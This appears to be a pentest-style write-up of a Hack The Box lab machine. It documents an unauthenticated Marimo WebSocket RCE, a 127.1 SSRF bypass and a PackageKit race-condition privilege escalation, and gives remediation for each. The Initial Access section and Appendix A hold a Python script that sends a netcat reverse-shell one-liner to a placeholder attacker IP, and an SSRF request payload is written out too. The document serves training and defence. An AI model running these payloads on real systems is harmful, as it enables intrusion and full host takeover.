# 🎯 Machine Information


---
# 📋 General Information

| Field               | Value        |
| ------------------- | ------------ |
| 🖥️ Machine         | Cohort       |
| 🌍 Platform         | HTB          |
| 💻 Operating System | Linux        |
| 🎯 Difficulty       | Easy         |
| 📅 Date Started     | 08/Ago/2026  |
| 📅 Date Finished    | 10/Ago/2026  |
| 👤 Author           | TheCyberGeek |

---
# 📄 Executive Summary

>The assessment identified a critical attack path that allowed full compromise of the target host without requiring valid user credentials. External testing revealed an exposed Marimo notebook service affected by CVE-2026-39987, which permitted unauthenticated access to a terminal WebSocket endpoint and resulted in direct operating-system command execution. 
>
>In parallel, the primary web application exposed a Server-Side Request Forgery (SSRF) vulnerability that allowed requests to localhost-restricted services by bypassing incomplete loopback validation. The SSRF issue disclosed information about internal-only endpoints and contributed to the discovery of the vulnerable Marimo service. 
>
>Using the unauthenticated remote code execution vulnerability, interactive shell access was obtained as the `marimo` service account. Local enumeration then identified PackageKit 1.2.8 as vulnerable to CVE-2026-41651, a TOCTOU race condition that allowed privilege escalation to root. 
>
>The attack chain demonstrated that an external attacker could progress from network access to full administrative control of the host through a combination of exposed development services, insufficient access control, and an unpatched local privilege-escalation vulnerability. 

Overall Risk Rating: Critical 

Key observations: 

- Unauthenticated remote code execution was possible from the Internet. 
- Internal services were discoverable through SSRF. 
- A vulnerable local PackageKit installation enabled full root compromise. 
- The combined weaknesses resulted in complete loss of confidentiality, integrity, and availability of the affected system.

###   🔗 Attack Chain

---
![](assets/Web%20Access%20and%20Privilege-2026-08-15-184437.png)

---
# 🌐 Attack Surface
 
## 🛰️ Open Services

| IP            | Port | Service | Tec     | Version |
| ------------- | ---- | ------- | ------- | ------- |
| 10.129.79.174 |      |         |         |         |
|               | 22   | SSH     | OpenSSH | 9.6p1   |
|               | 80   | HTTP    | Nginx   | 1.24.0  |
|               | 443  | HTTPS   | Nginx   | 1.24.0  |


---
## 🌍 Domains

| 🖥️ IP        | 🌐 Domain  | 🌍 Subdomain                     | 📍 Status / Notes |
| :------------ | :--------- | :------------------------------- | :---------------- |
| 10.129.79.174 | cohort.htb |                                  |                   |
|               |            | ↳ nb-1be3782a8afd3ad5.cohort.htb | 200               |



---

## ⚙️ Technologies

| Domain / IP                             | Technology | Version        | Notes                |
| --------------------------------------- | ---------- | -------------- | -------------------- |
| https://cohort.htb/                     |            |                |                      |
|                                         | ↳ Nginx    | 1.24.0         | Servidor Web         |
|                                         | ↳ Vue.js   | 3              | Framework            |
|                                         | ↳ Axios    | Not determined | Client Http          |
| https://nb-1be3782a8afd3ad5.cohort.htb/ |            |                |                      |
|                                         | ↳Marimo    | 0.20.4         | Notebook interactivo |


---

# 🔍 Reconnaissance

## Enumeration Commands

```bash
nmap -p22,443,80 -sCV -oN Services 10.129.79.174
```

---

## Raw Output

```ruby
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Not valid before: 2026-06-01T18:47:07
|_Not valid after:  2126-05-08T18:47:07
|_http-title: Cohort Analytics
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
## Analysis

>The initial reconnaissance identified a relatively small external attack surface consisting of SSH and HTTPS services. HTTP traffic was redirected to HTTPS, and the TLS certificate disclosed a wildcard entry for `*.cohort.htb`, indicating the possible existence of additional subdomains. 
>
>Further enumeration revealed the subdomain `nb-1be3782a8afd3ad5.cohort.htb`, which exposed a Marimo notebook instance. Technology fingerprinting showed that the main application was a Vue.js-based frontend communicating with backend APIs, while the subdomain hosted an interactive notebook environment running Marimo 0.20.4. 
>
>The combination of a publicly reachable notebook service and an API endpoint capable of performing server-side requests suggested two distinct attack vectors: 

- Direct exposure of a development-oriented service. 
- Potential access to internal-only resources through SSRF.
 
>These observations guided the subsequent vulnerability validation and exploitation activities.

---
## Evidence

📷 Screenshot
![](assets/Pasted%20image%2020260805184229.png)

---

# 🚨 Findings

## 🟣 WEB-001 —  Pre-Auth Terminal WebSocket RCE  (CVE-2026-39987)

### 📋 Finding Metadata

| Field         | Value                                                       |
| ------------- | ----------------------------------------------------------- |
| Finding ID    | WEB-001                                                     |
| Severity      | 🟣 CRITICAL                                                 |
| Status        | Confirmed                                                   |
| Domain        | nb-1be3782a8afd3ad5.cohort.htb                              |
| Endpoint      | /terminal/ws                                                |
| IP            | 10.129.79.174                                               |
| Service       | Marimo                                                      |
| Version       | 0.20.4                                                      |
| Vulnerability | Pre-Auth RCE                                                |
| CVE           | CVE-2026-39987                                              |
| CWE           | CWE-306 (Missing Authentication for Critical Function)      |
| OWASP         | A01:2021 – Broken Access Control                            |
| CVSS          | CVSS:3.1 /AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C |
| Score         | 9.3                                                         |

---

### 📝 Description

>A pre-authentication remote code execution vulnerability was identified in Marimo version 0.20.4 affecting the terminal WebSocket functionality exposed through the `/terminal/ws` endpoint. The application exposed an interactive terminal channel over WebSocket without requiring authentication. An unauthenticated remote attacker could establish a WebSocket connection and send terminal input that was processed by the backend terminal service. Because access control was not enforced on this critical functionality, arbitrary commands could be executed on the underlying Linux host with the privileges of the Marimo service account. The issue is associated with CVE-2026-39987 and results from missing authentication for a critical function. Successful exploitation enables complete remote command execution without valid credentials or prior access to the application.
>
>During the assessment, the vulnerability was confirmed by establishing an unauthenticated WebSocket session, executing operating-system commands, and obtaining an interactive reverse shell on the target host.

---
### ⚠️ Risk

>Successful exploitation allows an unauthenticated attacker to:

- Execute arbitrary operating-system commands remotely.
- Obtain interactive shell access to the server.
- Read application and system files.
- Extract credentials, tokens, and configuration secrets.
- Establish persistence on the host.
- Move laterally within the environment.
- Enumerate and exploit additional privilege-escalation vectors.
- Achieve full compromise of the affected system when chained with other weaknesses.

>Because the vulnerability is exploitable remotely, without authentication, and with low attack complexity, it represents a critical risk to the confidentiality, integrity, and availability of the environment.

---
### 🔎 Discovery

#### Command

```bash
curl -k -X GET https://nb-1be3782a8afd3ad5.cohort.htb/api/version
```
#### Output

```text
0.20.4
```
#### Analysis

>The exposed Marimo instance was first enumerated through the public API endpoint `/api/version`, which disclosed the running version as 0.20.4.
>
>Review of the vendor’s release history and publicly available security information confirmed that this version is affected by CVE-2026-39987, a vulnerability involving unauthenticated access to the terminal WebSocket endpoint. The endpoint `/terminal/ws` accepted WebSocket connections from unauthenticated users and provided access to backend terminal functionality.
>
>This behavior indicated that authentication and authorization controls were not enforced before granting access to a security-sensitive feature capable of executing system commands. The exposed functionality provided a direct path from network access to operating-system level code execution.
---
#### Evidence

📷 Screenshot
![](assets/Pasted%20image%2020260807130004.png)

Appendix C contains the public security advisory used to validate that the identified Marimo version was affected by CVE-2026-39987.

---
### 🧠 Technical Analysis

>The assessment confirmed that the target was running Marimo 0.20.4, a version vulnerable to CVE-2026-39987. An unauthenticated WebSocket connection was established to the endpoint:

`wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws`

>A custom Python proof-of-concept script (`Poc_RevWs.py`) was developed to interact with the terminal channel and automate command execution. Through this connection, arbitrary shell commands were successfully transmitted and executed by the backend service. After confirming command execution, a reverse shell payload was delivered through the WebSocket session, resulting in interactive access to the target system as the marimo user. The vulnerability demonstrates a complete breakdown of access control around a critical administrative feature and provides direct operating-system level access without authentication.
---
### 💥 Exploitation
#### Payload

```bash
python3 Poc_RevWs.py
```

---
#### Expected Result

>The application should require authentication and authorization before allowing access to the `/terminal/ws` endpoint. Unauthenticated users should be unable to establish a terminal WebSocket session, execute commands, or interact with backend shell functionality. Connection attempts without a valid authenticated session should be rejected with an appropriate HTTP or WebSocket authorization error.

#### Actual Result

>The application accepted a WebSocket connection to `/terminal/ws` without requiring authentication. Commands sent through the WebSocket channel were executed on the underlying Linux host, and a reverse shell was successfully established. This provided interactive operating-system access as the marimo user and confirmed full remote code execution.

---
#### Evidence
📷 Screenshot
![](assets/Pasted%20image%2020260807131219.png)

---
## 🎯 Impact

An unauthenticated remote attacker was able to achieve remote code execution on the underlying Linux host.

Successful exploitation resulted in:

- Arbitrary command execution as the `marimo` user.
- Interactive reverse shell access.
- Access to application and system files.
- Enumeration of local users, services, and privileges.
- Extraction of sensitive information from the host.
- Establishment of a stable foothold for further post-exploitation activities.

 This vulnerability represents a complete compromise of the application host and may enable subsequent privilege escalation and lateral movement within the environment

---
### 🔧 Remediation

To remediate this vulnerability:

- Upgrade Marimo to a version that addresses CVE-2026-39987.
- Restrict access to `/terminal/ws` to authenticated users only.
- Enforce server-side authorization checks before creating terminal sessions.
- Disable terminal functionality if it is not required in production.
- Place the service behind a reverse proxy enforcing authentication and access control.
- Restrict network exposure of development and notebook services.
- Monitor WebSocket connections for unauthorized access attempts.
- Rotate credentials and secrets that may have been exposed.
- Review the host for indicators of compromise and remove any unauthorized persistence mechanisms.
---

### 📚 References

- CVE-2026-39987 – NVD
- CWE-306: Missing Authentication for Critical Function
- OWASP Top 10 2021 – A01: Broken Access Control
- Marimo release history and security advisories
- Vendor documentation for terminal and WebSocket functionality


---
## 🔴 WEB-002 — SSRF via Incomplete Loopback Validation 

### 📋 Finding Metadata

| Field         | Value                                        |
| ------------- | -------------------------------------------- |
| Finding ID    | WEB-002                                      |
| Severity      | 🔴 HIGH                                      |
| Status        | Confirmed                                    |
| Domain        | cohort.htb                                   |
| Endpoint      | /api/validate                                |
| IP            | 10.129.79.174                                |
| Service       | HTTP API                                     |
| Version       | N/A                                          |
| Vulnerability | Server-Side Request Forgery (SSRF)           |
| CVE           | N/A                                          |
| CWE           | CWE-918                                      |
| OWASP         | A10:2021-Server-Side Request Forgery (SSRF)  |
| CVSS          | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| Score         | 8.0                                          |

---

### 📝 Description

> A Server-Side Request Forgery (SSRF) vulnerability was identified in the `/api/validate` endpoint of `cohort.htb`. The endpoint accepted a user-supplied URL and performed a server-side HTTP request to retrieve and process the remote resource.
>
> The application attempted to block requests to internal and loopback addresses; however, the protection relied on an insufficient blacklist-based validation mechanism. Alternative loopback representations, such as `127.1`, were not filtered and could be used to bypass the restriction.
>
> Successful exploitation allowed an unauthenticated attacker to force the server to send requests to services bound to localhost, access internal-only endpoints, and retrieve information that was not intended to be externally accessible.
>
> The vulnerability was subsequently used to enumerate internal endpoints and disclose information about an additional internal service that contributed to further exploitation of the target environment.

---

### ⚠️ Risk

Successful exploitation allows an attacker to:

- Access internal services bound to localhost.
- Enumerate internal endpoints and applications.
- Bypass network-based access restrictions.
- Retrieve sensitive internal information and metadata.
- Interact with internal APIs not intended for external exposure.
- Chain the vulnerability with additional weaknesses, including information disclosure and remote code execution.

---

### 🔎 Discovery

#### Command

```bash
{"url":"http://127.1/","format":"csv"}
```

#### Output

```text
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 07 Aug 2026 22:43:47 GMT
Content-Type: application/json
Content-Length: 1077
Connection: keep-alive

{"ok": true, "fetched_status": 200, "content_type": "text/html", "preview":........
```

#### Analysis

> Initial SSRF validation attempts using common loopback addresses returned the following response:

`{"ok": false, "message": "Internal or loopback addresses are not permitted."}`

> This indicated that the application implemented a restriction against requests targeting localhost. Further testing focused on alternative loopback representations commonly used to bypass blacklist-based SSRF protections. Supplying `http://127.1/` successfully bypassed the validation and the server performed the request, returning a valid HTTP 200 response. The behavior suggests that the application relied on an incomplete blacklist that failed to normalize and validate equivalent loopback representations before performing the outbound request.
---
#### Evidence

📷 Screenshot :
![](assets/Pasted%20image%2020260807165113.png)

---

### 🧠 Technical Analysis

>After confirming that requests to localhost could be performed through the SSRF vulnerability, internal endpoint enumeration was conducted by supplying different paths to the vulnerable parameter. Enumeration revealed the `/status` endpoint, which was accessible only from the server-side context. The response disclosed information about an additional internal domain and service that were not externally exposed. The SSRF vulnerability therefore provided visibility into internal application components and enabled further attack-path development. The information obtained from the `/status` endpoint was later correlated with a vulnerable Marimo service, which is documented in **WEB-001**.

---

### 💥 Exploitation

#### Payload

```bash
POST /api/validate HTTP/1.1

Host: cohort.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://cohort.htb/portal.html
Content-Type: application/json
Content-Length: 44
Origin: https://cohort.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"url":"http://127.1/status","format":"csv"}
```
---
#### Expected Result

> The application should reject requests targeting localhost and other internal network addresses, including alternative loopback representations such as `127.1`, `127.0.1`, hexadecimal, octal, and IPv6 loopback formats. No server-side request should be performed and no internal response should be returned to the user.
---
#### Actual Result

> The endpoint accepted the URL `http://127.1/status`, performed the request from the server-side context, and returned the response generated by the internal endpoint. The response disclosed information about an internal service that was not externally accessible, confirming successful SSRF exploitation and bypass of the loopback restriction.
---
#### Evidence

📷 Screenshot
![](assets/Pasted%20image%2020260807170154.png)

---

## 🎯 Impact

 > An unauthenticated attacker was able to bypass the application's loopback protection and force the server to issue requests to internal-only services.

Successful exploitation resulted in:

- Access to localhost-restricted endpoints.
- Internal application and endpoint enumeration.
- Disclosure of information about additional internal services.
- Bypass of intended network segmentation controls.
- Expansion of the attack surface available to the attacker.
- Facilitation of subsequent exploitation steps documented in **WEB-001**.

Although the SSRF did not directly provide remote code execution, it exposed internal functionality that was not externally reachable and materially contributed to the overall compromise path of the target environment.`

---
### 🔧 Remediation

To remediate this vulnerability:

- Implement an allowlist-based validation for outbound requests instead of a blacklist.
- Normalize and resolve all user-supplied hostnames and IP addresses before validation.
- Block all loopback, link-local, private, and internal address ranges, including IPv4, IPv6, hexadecimal, octal, and alternative representations.
- Perform DNS resolution and validate the final resolved IP address immediately before the request is sent.
- Disable automatic redirects or re-validate the destination after each redirect.
- Restrict outbound network access from the application server to only approved external destinations.
- Avoid returning internal response bodies, headers, or metadata to the client.
- Implement monitoring and alerting for unusual outbound requests initiated by the application.

---

### 📚 References

- CWE-918: Server-Side Request Forgery (SSRF)
- OWASP Top 10 2021 – A10: Server-Side Request Forgery (SSRF)
- OWASP SSRF Prevention Cheat Sheet
- PortSwigger Web Security Academy – SSRF
- RFC 1122 – Requirements for Internet Hosts

---
# 🔐 Credentials

| Username | Password | Source | Privilege | Valid |
| -------- | -------- | ------ | --------- | ----- |
| N/A      | N/A      | N/A    | N/A       | N/A   |


---

# 🚪 Initial Access

## Method

>A reverse shell was established by exploiting the unauthenticated terminal WebSocket vulnerability documented in WEB-001 (CVE-2026-39987). The vulnerability provided direct command execution on the underlying Linux host, allowing the establishment of an interactive shell as the `marimo` service account.

---

## Commands

```bash
python3 Poc_RevWs.py
'\x1b[?2004h\x1b]0;marimo@cohort: ~\x07\x1b[01;32mmarimo@cohort\x1b[00m:\x1b[01;34m~\x1b[00m$ '
'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|/usr/bin/nc <ATTACKER_IP> 3333 >/tmp/f\r\n\x1b[?2004l\r'
```

---

## Session Information

| Field   | Value         |
| ------- | ------------- |
| User    | marimo        |
| Shell   | /usr/bin/bash |
| Service | HTTP (Marimo) |
| Port    | 3333          |

---




# ⬆️ Privilege Escalation

## 🟣LPE-001 - PackageKit TOCTOU Race Condition (CVE-2026-41651)
### 📋 Finding Metadata

| Field          | Value                                             |
| -------------- | ------------------------------------------------- |
| Finding ID     | LPE-001                                           |
| Severity       | 🟣 Critical                                       |
| Status         | Confirmed                                         |
| Host           | cohort.htb                                        |
| Source Context | marimo                                            |
| Target Context | root                                              |
| Component      | PackageKit                                        |
| Target         | PackageKit daemon (packagekitd)                   |
| Vulnerability  | Time-of-check Time-of-use (TOCTOU) Race Condition |
| CVE            | CVE-2026-41651                                    |
| CWE            | CWE-367                                           |
| OWASP          | A01:2021 – Broken Access Control                  |
| CVSS           | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H      |
### 📝 Description

>A local privilege escalation vulnerability was identified in PackageKit version 1.2.8, associated with CVE-2026-41651. The vulnerability arises from a Time-of-check Time-of-use (TOCTOU) race condition within the PackageKit daemon (`packagekitd`), where security checks and subsequent privileged file operations can be desynchronized.
>
>An authenticated local user can exploit this race condition to gain elevated privileges and execute code as root.
### 🕵️‍♂️ Enumeration

```bash
dpkg -l | grep packagekit
```
### 📜Result

>The system was found to be running PackageKit 1.2.8, a version affected by CVE-2026-41651.

#### Evidence
📷 Screenshot
![](assets/Pasted%20image%2020260807185307.png)

---
### 🔬Analysis

>After reviewing common local privilege escalation vectors, additional enumeration was performed using LinPEAS. The enumeration identified that PackageKit 1.2.8 was installed on the target system. 
>
>Version verification confirmed that the installed package was affected by CVE-2026-41651, a race condition vulnerability that allows a low-privileged local user to win a timing window between validation and privileged operations performed by `packagekitd`. 
>
>Because the host met the required conditions for exploitation, this issue represented a viable path to full administrative compromise. 

---
### 💥 Exploitation

>The public exploit Pox2root.py was executed from the compromised `marimo` context.

```bash
python3 Pox2root.py 
```

>The exploit repeatedly triggered the vulnerable PackageKit code path and successfully won the race condition, resulting in the creation of a SUID root shell.

The public proof-of-concept referenced during the assessment is documented in Appendix B.

```bash
[*] CVE-2026-41651 — PackageKit LPE (Python Edition)
[+] Packages generated at /tmp
[+] Active trans: /2_aedbdcdd
[*] Triggering flood of requests (SIMULATE -> REAL)...
[*] Monitoring /tmp/.suid_bash...
....
[+++] SUCCESS: /tmp/.suid_bash is SUID ROOT!
.suid_bash-5.2# whoami
root
```
---

### 📜 Result

>Successful exploitation resulted in a root shell, confirming that the vulnerable PackageKit daemon could be abused to escalate privileges from `marimo` to `root`.

#### Evidence
📷 Screenshot
![](assets/Pasted%20image%2020260807190107.png)

---
### 🎯 Impact

>A low-privileged local user was able to exploit a race condition in PackageKit and obtain full root privileges on the target system.

Successful exploitation allowed the attacker to:

- Escalate privileges from `marimo` to `root`.
- Execute arbitrary commands with administrative privileges.
- Access and modify any file on the system.
- Disable security controls and logging mechanisms.
- Install persistence mechanisms.
- Fully compromise the confidentiality, integrity, and availability of the host.

---
### 🔧 Remediation

>To remediate this vulnerability, the following actions are recommended:

- Upgrade PackageKit and apply all vendor security updates that include the fix for CVE-2026-41651.
- Restrict local shell access to trusted users only.
- Remove unnecessary SUID binaries and periodically audit SUID permissions.
- Monitor PackageKit activity and privileged file operations for abnormal behavior.
- Enable endpoint detection and integrity monitoring to detect unauthorized privilege escalation attempts.
- Review systems running vulnerable PackageKit versions and prioritize patching according to exposure and business criticality.

---

# 🖥️ Post Exploitation

## 👥 Users

| **User** | **Description**         | **Access Obtained** |
| -------- | ----------------------- | ------------------- |
| `marimo` | Web application account | Initial foothold    |
| `root`   | Administrative account  | Full compromise     |

---
## 🗂️Interesting Files

| **File**                              | **Description**                                             | **Security Relevance**                |
| ------------------------------------- | ----------------------------------------------------------- | ------------------------------------- |
| `/var/log/syslog (Sysmon Event ID 1)` | Marimo process command line containing authentication token | Token disclosure / session compromise |



---
## 🛡️Sensitive Information

>Post-exploitation review identified sensitive operational information exposed through system logs. The file `/var/log/syslog` contained process execution records associated with the Marimo service, including command-line parameters and authentication-related tokens. Exposure of such information may facilitate session hijacking, unauthorized access to notebook functionality, or replay of authenticated requests if the tokens remain valid. No additional credentials, SSH keys, or database passwords were required to complete the compromise path documented in this assessment; however, the presence of authentication artifacts in centralized logs represents an additional security concern and should be remediated as part of the overall hardening effort.
---
## 🕷️Persistence Opportunities

>After obtaining root privileges, the assessment confirmed that an attacker would have sufficient permissions to establish persistence through multiple operating-system mechanisms, including:

- Installation of SSH authorized keys.
- Creation of privileged local users.
- Deployment of systemd services or timers.
- Modification of startup scripts and shell profiles.
- Installation of additional SUID binaries. 
- Tampering with logging or monitoring configurations.

>No persistence mechanisms were intentionally deployed during the assessment. The evaluation was limited to confirming that the achieved privilege level would make long-term persistence feasible if an attacker chose to do so.

---
# 📚 Lessons Learned

## ✅ What Worked

- Enumeration of alternative subdomains revealed an exposed notebook service that was not visible from the main application.
    
- Version fingerprinting through publicly accessible API endpoints enabled accurate identification of vulnerable software.
    
- SSRF testing using alternative loopback representations (`127.1`) successfully bypassed blacklist-based validation.
    
- Post-exploitation enumeration with both manual techniques and LinPEAS efficiently identified a viable local privilege-escalation vector.
    
- Correlating information obtained from SSRF with the exposed Marimo service allowed construction of a complete attack path rather than treating the findings as isolated issues.

---

## ❌ Mistakes

- Initial testing focused on the main application and delayed investigation of the wildcard subdomain disclosed by the TLS certificate.
    
- Early SSRF validation relied primarily on canonical loopback addresses (`127.0.0.1` and `localhost`), which could have led to the incorrect assumption that the restriction was effective.
    
- Additional enumeration of internal endpoints could have been performed earlier to accelerate correlation between the SSRF finding and the exposed Marimo service.
    
- The privilege-escalation path was initially explored through common SUID and sudo vectors before identifying the vulnerable PackageKit installation, resulting in some unnecessary enumeration effort.

---

## 💡 Key Takeaways

-  Development and notebook services should never be exposed directly to untrusted networks without strong authentication and network restrictions.
    
- Blacklist-based SSRF protections are insufficient; destination normalization and allowlist validation are required.
    
- Publicly exposed version information significantly increases the likelihood of successful vulnerability targeting.
    
- Local privilege-escalation vulnerabilities remain highly impactful even when initial access is obtained through a low-privileged service account.
    
- The overall compromise resulted from the combination of multiple weaknesses rather than a single vulnerability, emphasizing the importance of defense in depth.

---
# 📎 Appendix 

## 📚Appendix A — Custom WebSocket RCE Validation Script (CVE-2026-39987)

### Poc_RevWs.py

>The following Python script was developed and used during the assessment to validate WEB-001 (Marimo Pre-Authentication Terminal WebSocket Remote Code Execution). 
>
>The script establishes a WebSocket connection to the exposed `/terminal/ws` endpoint and was used to obtain unauthenticated command execution on the target host, resulting in an interactive reverse shell as the `marimo` user.

```python
import ssl
import time
from websocket import create_connection

url = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"

ws = create_connection(
    url,
    sslopt={"cert_reqs": ssl.CERT_NONE}
)

# Esperar a que el terminal esté listo
time.sleep(1)

# Enviar el comando
ws.send("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|/usr/bin/nc <IP> 3333 >/tmp/f\n")

# Leer varias respuestas
for _ in range(5):
    try:
        msg = ws.recv()
        print(repr(msg))
    except Exception as e:
        print(e)
        break

ws.close()

```

>This script was used solely for controlled validation of the vulnerability during the assessment.

---
## 📚Appendix B — Public Privilege Escalation Exploit Reference (CVE-2026-41651)
### GitHub Proof of Concept (Pox2root.py)

>The public proof-of-concept used as a reference during the validation of LPE-001 (PackageKit TOCTOU Race Condition Local Privilege Escalation) is publicly available through the following GitHub repository.

- Product: PackageKit
- Affected Version: 1.2.8
- Vulnerability: Time-of-check Time-of-use (TOCTOU) Race Condition
- Privilege Escalation: Local user to root

For reproducibility and technical reference, the proof-of-concept can be obtained from:

https://github.com/0xBlackash/CVE-2026-41651

This repository was used as the public technical reference during the validation of the privilege escalation vulnerability identified on the target host.
## 📚Appendix C — Public Vulnerability Confirmation Reference (WEB-001)
### Marimo Security Advisory

>The following public security advisory was used to confirm that the version identified during the assessment (Marimo 0.20.4) was affected by the vulnerability documented in WEB-001 (CVE-2026-39987)

- Product: Marimo
- Affected Version: 0.20.4
- Vulnerability: Pre-Authentication Terminal WebSocket Remote Code Execution
- Advisory: GHSA-2679-6mx9-h9xc

For reproducibility and version validation, the advisory can be obtained from:

[https://github.com/marimo-team/marimo/security/advisories/GHSA-2679-6mx9-h9xc](https://github.com/marimo-team/marimo/security/advisories/GHSA-2679-6mx9-h9xc)

This reference was used to validate that the exposed Marimo instance identified during the assessment was running a version affected by the reported vulnerability.

---
# 📊 Findings Summary

| ID      | Severity    | Vulnerability                                     | Status    |
| :------ | :---------- | :------------------------------------------------ | :-------- |
| WEB-001 | 🟣 CRITICAL | Pre-Auth Terminal WebSocket RCE  (CVE-2026-39987) | Confirmed |
| LPE-001 | 🟣 CRITICAL | PackageKit TOCTOU Race Condition (CVE-2026-41651) | Confirmed |
| WEB-002 | 🔴 HIGH     | SSRF via Incomplete Loopback Validation           | Confirmed |

---

# 🧠 Methodology Summary

<p align="center">
  <img src="assets/Attacker%20Recon%20to%20Privilege-2026-08-16-180957.png" alt="Attacker Recon" width="250">
</p>